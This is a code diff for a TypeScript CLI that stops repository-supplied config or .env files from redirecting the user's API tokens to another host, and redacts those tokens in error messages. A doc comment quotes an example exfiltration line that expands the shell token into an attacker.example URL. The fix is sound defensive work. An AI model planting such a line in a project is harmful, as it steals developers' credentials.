@@ -16,6 +16,7 @@ import { readToken } from "../auth/token-store.ts";
 import { ensureAuthenticated } from "../auth/login.ts";
 import {
   type ApiUrlEnvKey,
+  DEFAULT_API_URL,
   isSameApiEndpoint,
   resolveCliApiUrl,
   resolveCliApiUrlWithOrigin,
@@ -228,8 +229,8 @@ export function resolveEnvironmentProjectReference():
 /**
  * How the effective API host was chosen, and whether the repository chose it.
  *
- * `repositorySteered` is true when files that ship with a clone — `veryfront.json`
- * or a project `.env` file — moved the CLI off the endpoint it would otherwise
+ * `repositorySteered` is true when files that ship with a clone (`veryfront.json`
+ * or a project `.env` file) moved the CLI off the endpoint it would otherwise
  * have used. Those files are attacker-controlled for any repository the
  * developer did not write, so ambient credentials must not follow them.
  */
@@ -254,7 +255,12 @@ export function resolveApiUrlTrust(
     // Set in the operator's own shell it confirms the host; read out of a
     // project `.env` file it is just more repository content.
     const source = getEnvSource(origin.key);
-    if (source.source === "env-file") {
+    // Naming the endpoint the CLI would have used anyway, in any equivalent
+    // spelling, steers nothing. Comparing against the resolved URL would be
+    // circular here because the env file supplied it, so the comparison is
+    // against the default endpoint, which is what the CLI falls back to once
+    // the repository's own inputs are set aside.
+    if (source.source === "env-file" && !isSameApiEndpoint(apiUrl, DEFAULT_API_URL)) {
       return {
         apiUrl,
         repositorySteered: true,
@@ -267,8 +273,8 @@ export function resolveApiUrlTrust(
 
   if (origin.source !== "config-file") return { apiUrl, repositorySteered: false };
 
-  // A config file that names the endpoint the CLI would have used anyway —
-  // in any equivalent spelling — steers nothing.
+  // A config file that names the endpoint the CLI would have used anyway, in
+  // any equivalent spelling, steers nothing.
   return {
     apiUrl,
     repositorySteered: !isSameApiEndpoint(apiUrl, resolveCliApiUrl(env)),
@@ -289,15 +295,58 @@ export function isUntrustedApiUrlCredentialError(error: unknown): boolean {
     (error instanceof Error && error.name === "UntrustedApiUrlCredentialError");
 }
 
+/** Below this length a "secret" would match too much ordinary text to redact. */
+const MIN_REDACTABLE_SECRET_LENGTH = 8;
+
+/**
+ * Reduce a repository-supplied URL to the part worth showing the developer.
+ *
+ * The origin keeps the protocol and host that identify the redirect and drops
+ * userinfo, path, query, and fragment, which is where an expanded credential
+ * lands.
+ */
+function toDisplayApiUrl(apiUrl: string): string {
+  try {
+    const { origin } = new URL(apiUrl);
+    if (origin !== "null") return origin;
+  } catch {
+    // Fall through: an unparseable URL still gets userinfo stripped below.
+  }
+  return sanitizeUrlCredentials(apiUrl);
+}
+
+/** Replace any ambient credential still visible in `text` with a placeholder. */
+function redactAmbientSecrets(text: string, secrets: readonly string[]): string {
+  let redacted = text;
+  for (const secret of secrets) {
+    if (secret.length < MIN_REDACTABLE_SECRET_LENGTH) continue;
+    redacted = redacted.split(secret).join("<REDACTED>");
+  }
+  return redacted;
+}
+
+/** Every ambient credential that must never be echoed back to the developer. */
+async function collectAmbientSecrets(env: EnvironmentConfig): Promise<string[]> {
+  const secrets: string[] = [];
+  if (env.apiToken) secrets.push(env.apiToken);
+  const storedToken = await readToken(env);
+  if (storedToken) secrets.push(storedToken);
+  return secrets;
+}
+
 /**
  * Explain the refusal to the developer running the command.
  *
- * A self-hosted `apiUrl` can carry userinfo, so the URL is redacted before it
- * reaches terminal output, `--json` payloads, or CI logs, and only the env
- * file's name is shown rather than its path on this machine.
+ * The URL is repository content, so only its origin is shown and userinfo is
+ * stripped before it reaches terminal output, `--json` payloads, or CI logs.
+ * A project `.env` value is variable-expanded as it loads, so an entry such as
+ * `VERYFRONT_API_URL=https://attacker.example/$VERYFRONT_API_TOKEN` carries the
+ * operator's real shell token into the URL. Any ambient credential still
+ * visible after that reduction is replaced with `<REDACTED>`. Only the env
+ * file's name is shown, never its path on this machine.
  */
-function describeUntrustedApiUrl(trust: ApiUrlTrust): string {
-  const safeApiUrl = sanitizeUrlCredentials(trust.apiUrl);
+function describeUntrustedApiUrl(trust: ApiUrlTrust, ambientSecrets: readonly string[]): string {
+  const safeApiUrl = redactAmbientSecrets(toDisplayApiUrl(trust.apiUrl), ambientSecrets);
   const steer = trust.steeringEnvFile === undefined
     ? `veryfront.json sets apiUrl to ${safeApiUrl}`
     : `The project ${
@@ -422,12 +471,23 @@ export async function resolveApiCredentialCandidatesForAuth(
   interactive = true,
 ): Promise<ApiCredentialCandidate[]> {
   const configFile = await readConfigJsonFile(projectDir);
-  const validationEnv = {
-    ...env,
-    apiUrl: resolveCliApiUrl(env, configFile?.apiUrl),
-  };
+  const trust = resolveApiUrlTrust(env, configFile);
+  const validationEnv = { ...env, apiUrl: trust.apiUrl };
 
-  return resolveApiCredentialCandidates(env, configFile, interactive, validationEnv);
+  const candidates = await resolveApiCredentialCandidates(
+    env,
+    configFile,
+    interactive,
+    validationEnv,
+  );
+
+  // `login`, `whoami`, and `up` validate a candidate by sending it to
+  // `validationEnv.apiUrl`, so these preflights reach the repository-supplied
+  // host before any call to `resolveConfig`. They need the same rule: a
+  // repository-steered host may only receive credentials the repository itself
+  // supplied, never a shell, stored-login, or unrelated .env token.
+  if (!trust.repositorySteered) return candidates;
+  return candidates.filter((entry) => isRepositorySuppliedCredential(entry, trust));
 }
 
 async function resolveConfigBase(
@@ -450,7 +510,9 @@ async function resolveConfigBase(
   );
 
   if (!apiToken && trust.repositorySteered) {
-    throw new UntrustedApiUrlCredentialError(describeUntrustedApiUrl(trust));
+    throw new UntrustedApiUrlCredentialError(
+      describeUntrustedApiUrl(trust, await collectAmbientSecrets(env)),
+    );
   }
 
   if (!apiToken && interactive) {
